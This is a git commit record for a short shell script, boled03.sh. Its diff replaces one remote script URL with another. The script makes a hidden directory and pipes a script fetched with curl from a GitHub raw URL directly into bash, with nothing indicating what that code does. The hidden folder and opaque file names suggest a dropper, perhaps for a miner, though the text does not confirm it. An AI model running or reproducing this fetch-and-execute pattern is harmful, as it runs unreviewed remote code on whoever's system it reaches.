b9c9a0001ba941d81325ad7337790d1d626858ee
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-26 04:11:11 +0700

    Update boled03.sh

--- boled03.sh
+++ boled03.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 mkdir .kap && cd .kap
-curl -sL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/build.sh | bash
+curl -sL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/mana.sh | bash
